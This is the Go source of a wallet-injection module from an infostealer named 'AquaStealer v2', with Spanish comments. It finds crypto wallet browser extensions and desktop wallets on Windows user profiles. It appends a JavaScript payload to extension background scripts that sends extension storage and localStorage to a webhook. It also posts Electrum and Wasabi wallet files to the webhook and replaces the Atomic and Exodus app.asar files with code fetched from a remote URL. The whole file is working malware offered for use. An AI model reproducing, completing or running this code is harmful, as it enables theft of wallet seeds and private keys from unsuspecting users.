package walletsinjection

// walletsinjection.go — AquaStealer v2 — Wallet injection expandido
//
// Wallets cubiertos:
//   Desktop apps: Atomic, Exodus, Electrum, Wasabi, Bitcoin Core, Litecoin Core
//   Browser extensions (Chrome/Edge/Brave/Opera): MetaMask, Phantom, Trust Wallet,
//     Coinbase Wallet, Binance Chain, Keplr, Solflare, Rabby, OKX, Ronin
//
// Para extensiones: modifica el background script del .crx descomprimido en el
// perfil del usuario para exfiltrar la seed phrase/private key al webhook

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/aqua/stealer/utils/fileutil"
	"github.com/aqua/stealer/utils/hardware"
)

// extensionPayload — JS inyectado en background scripts de extensiones
// Intercepta el almacenamiento local y envía seeds/keys al webhook
const extensionPayload = "(function(){\n" +
	"  const wh = '%WEBHOOK%';\n" +
	"  const send = (d) => fetch(wh, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'\u0060\u0060\u0060'+d+'\u0060\u0060\u0060',username:'AquaStealer-Wallet'})}).catch(()=>{});\n" +
	"  const scan = () => {\n" +
	"    try {\n" +
	"      chrome.storage.local.get(null, (items) => {\n" +
	"        const s = JSON.stringify(items);\n" +
	"        if (s.length > 10) send('[Extension Storage]\\n' + s.substring(0, 1900));\n" +
	"      });\n" +
	"    } catch(e) {}\n" +
	"    try {\n" +
	"      const keys = Object.keys(localStorage);\n" +
	"      if (keys.length) send('[LocalStorage]\\n' + keys.map(k => k+': '+localStorage.getItem(k)).join('\\n').substring(0, 1900));\n" +
	"    } catch(e) {}\n" +
	"  };\n" +
	"  setTimeout(scan, 3000);\n" +
	"  setInterval(scan, 30000);\n" +
	"})();\n"

// browserExtensionIDs — extension IDs de wallets conocidas por navegador
var browserExtensionIDs = map[string]string{
	"nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
	"bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
	"egjidjbpglichdcondbcbdnbeeppgdph": "Trust Wallet",
	"hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase Wallet",
	"fhbohimaelbohpjbbldcngcnapndodjp": "Binance Chain",
	"dmkamcknogkgcdfhhbddcghachkejeap": "Keplr",
	"bhhhlbepdkbapadjdnnojkbgioiodbic": "Solflare",
	"acmacodkjbdgmoleebolmdjonilkdbch": "Rabby",
	"mcohilncbfahbmgdjkbpemcciiolgcge": "OKX Wallet",
	"kjmoohlgokccodicjjfebfomlbljgfhk": "Ronin Wallet",
	"odbfpeeihdkbihmopkbjmoonfanlbfcl": "Brave Wallet",
	"hpglfhgfnhbgpjdenjgmdgoeiappafln": "Guarda",
	"blnieiiffboillknjnepogjhkgnoapac": "XDEFI",
	"nanjmdknhkinifnkgdcggcfnhdaammmj": "Jaxx Liberty",
	"jiidiaalihmmhdlpbaidlbpjpiicoolj": "OneKey",
}

// browserProfilePaths — rutas de perfiles de navegadores comunes
func getBrowserProfilePaths(user string) []string {
	return []string{
		filepath.Join(user, "AppData", "Local", "Google", "Chrome", "User Data"),
		filepath.Join(user, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		filepath.Join(user, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		filepath.Join(user, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		filepath.Join(user, "AppData", "Local", "Vivaldi", "User Data"),
		filepath.Join(user, "AppData", "Local", "Chromium", "User Data"),
	}
}

// InjectBrowserExtensions — inyecta en extensiones de wallet en perfiles de navegador
func InjectBrowserExtensions(webhook string) {
	for _, user := range hardware.GetUsers() {
		for _, profileBase := range getBrowserProfilePaths(user) {
			if !fileutil.IsDir(profileBase) {
				continue
			}
			// Buscar en Default y Profile X
			profiles, _ := filepath.Glob(filepath.Join(profileBase, "Default"))
			profilesN, _ := filepath.Glob(filepath.Join(profileBase, "Profile*"))
			profiles = append(profiles, profilesN...)

			for _, profile := range profiles {
				extDir := filepath.Join(profile, "Extensions")
				if !fileutil.IsDir(extDir) {
					continue
				}
				for extID, name := range browserExtensionIDs {
					extPath := filepath.Join(extDir, extID)
					if !fileutil.IsDir(extPath) {
						continue
					}
					// Buscar la versión instalada
					versions, _ := filepath.Glob(filepath.Join(extPath, "*"))
					for _, ver := range versions {
						injectExtension(ver, webhook, name)
					}
				}
			}
		}
	}
}

// injectExtension — inyecta payload en los scripts de background de una extensión
func injectExtension(extVersionDir string, webhook string, walletName string) {
	// Leer manifest.json para encontrar background scripts
	manifestPath := filepath.Join(extVersionDir, "manifest.json")
	data, err := os.ReadFile(manifestPath)
	if err != nil {
		return
	}
	var manifest map[string]interface{}
	if err := json.Unmarshal(data, &manifest); err != nil {
		return
	}

	payload := strings.Replace(extensionPayload, "%WEBHOOK%", webhook, -1)
	payload = fmt.Sprintf("// %s\n", walletName) + payload

	// Manifest v2: background.scripts
	if bg, ok := manifest["background"].(map[string]interface{}); ok {
		if scripts, ok := bg["scripts"].([]interface{}); ok {
			for _, s := range scripts {
				if scriptName, ok := s.(string); ok {
					scriptPath := filepath.Join(extVersionDir, scriptName)
					appendToScript(scriptPath, payload)
				}
			}
		}
		// Manifest v2: background.page
		if page, ok := bg["page"].(string); ok {
			pagePath := filepath.Join(extVersionDir, page)
			injectIntoHTML(pagePath, payload)
		}
	}

	// Manifest v3: background.service_worker
	if bg, ok := manifest["background"].(map[string]interface{}); ok {
		if sw, ok := bg["service_worker"].(string); ok {
			swPath := filepath.Join(extVersionDir, sw)
			appendToScript(swPath, payload)
		}
	}

	// También buscar archivos JS comunes de background
	commonBG := []string{"background.js", "background-script.js", "sw.js", "service_worker.js"}
	for _, bgFile := range commonBG {
		bgPath := filepath.Join(extVersionDir, bgFile)
		if fileutil.Exists(bgPath) {
			appendToScript(bgPath, payload)
		}
	}
}

// appendToScript — agrega payload al final de un script JS
func appendToScript(path string, payload string) {
	if !fileutil.Exists(path) {
		return
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return
	}
	// No inyectar dos veces
	if strings.Contains(string(data), "AquaStealer-Wallet") {
		return
	}
	newData := append(data, []byte("\n\n"+payload)...)
	_ = os.WriteFile(path, newData, 0644)
}

// injectIntoHTML — inyecta script tag en HTML de background page
func injectIntoHTML(path string, payload string) {
	if !fileutil.Exists(path) {
		return
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return
	}
	if strings.Contains(string(data), "AquaStealer-Wallet") {
		return
	}
	scriptTag := fmt.Sprintf("\n<script>\n%s\n</script>\n</body>", payload)
	newData := strings.Replace(string(data), "</body>", scriptTag, 1)
	_ = os.WriteFile(path, []byte(newData), 0644)
}

// --- Desktop wallet injections ---

func Run(atomic_injection_url, exodus_injection_url, webhook string) {
	AtomicInjection(atomic_injection_url, webhook)
	ExodusInjection(exodus_injection_url, webhook)
	ElectrumInjection(webhook)
	WasabiInjection(webhook)
	// Extensiones de navegador
	go InjectBrowserExtensions(webhook)
}

func AtomicInjection(url, webhook string) {
	for _, user := range hardware.GetUsers() {
		atomicPath := filepath.Join(user, "AppData", "Local", "Programs", "atomic")
		if !fileutil.IsDir(atomicPath) {
			continue
		}
		asarPath := filepath.Join(atomicPath, "resources", "app.asar")
		licensePath := filepath.Join(atomicPath, "LICENSE.electron.txt")
		if fileutil.Exists(asarPath) {
			Injection(asarPath, licensePath, url, webhook)
		}
	}
}

func ExodusInjection(url, webhook string) {
	for _, user := range hardware.GetUsers() {
		exodusPath := filepath.Join(user, "AppData", "Local", "exodus")
		if !fileutil.IsDir(exodusPath) {
			continue
		}
		files, _ := filepath.Glob(filepath.Join(exodusPath, "app-*"))
		if len(files) == 0 {
			continue
		}
		asarPath := filepath.Join(files[0], "resources", "app.asar")
		licensePath := filepath.Join(files[0], "LICENSE")
		if fileutil.Exists(asarPath) {
			Injection(asarPath, licensePath, url, webhook)
		}
	}
}

// ElectrumInjection — modifica el script de Electrum para exfiltrar seeds
func ElectrumInjection(webhook string) {
	for _, user := range hardware.GetUsers() {
		// Electrum wallet paths
		walletPaths := []string{
			filepath.Join(user, "AppData", "Roaming", "Electrum", "wallets"),
			filepath.Join(user, "AppData", "Roaming", "Electrum-LTC", "wallets"),
		}
		for _, wp := range walletPaths {
			if !fileutil.IsDir(wp) {
				continue
			}
			// Leer archivos de wallet (son JSON)
			entries, _ := os.ReadDir(wp)
			for _, e := range entries {
				if e.IsDir() {
					continue
				}
				walletFile := filepath.Join(wp, e.Name())
				data, err := os.ReadFile(walletFile)
				if err != nil {
					continue
				}
				// Exfiltrar via webhook
				go func(d []byte, name string) {
					payload := fmt.Sprintf("**[Electrum Wallet]** `%s`\n```%s```", name, string(d[:min(len(d), 1800)]))
					sendToWebhook(webhook, payload)
				}(data, e.Name())
			}
		}
	}
}

// WasabiInjection — exfiltra wallets de Wasabi
func WasabiInjection(webhook string) {
	for _, user := range hardware.GetUsers() {
		wasabiPath := filepath.Join(user, "AppData", "Roaming", "WalletWasabi", "Client", "Wallets")
		if !fileutil.IsDir(wasabiPath) {
			continue
		}
		entries, _ := os.ReadDir(wasabiPath)
		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			walletFile := filepath.Join(wasabiPath, e.Name())
			data, err := os.ReadFile(walletFile)
			if err != nil {
				continue
			}
			go func(d []byte, name string) {
				payload := fmt.Sprintf("**[Wasabi Wallet]** `%s`\n```%s```", name, string(d[:min(len(d), 1800)]))
				sendToWebhook(webhook, payload)
			}(data, e.Name())
		}
	}
}

func sendToWebhook(webhook, content string) {
	type msg struct {
		Content  string `json:"content"`
		Username string `json:"username"`
	}
	data, _ := json.Marshal(msg{Content: content, Username: "AquaStealer"})
	resp, err := http.Post(webhook, "application/json", strings.NewReader(string(data)))
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func Injection(path, licensePath, injection_url, webhook string) {
	if !fileutil.Exists(path) {
		return
	}
	resp, err := http.Get(injection_url)
	if err != nil || resp.StatusCode != http.StatusOK {
		return
	}
	defer resp.Body.Close()
	out, err := os.Create(path)
	if err != nil {
		return
	}
	defer out.Close()
	_, _ = io.Copy(out, resp.Body)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
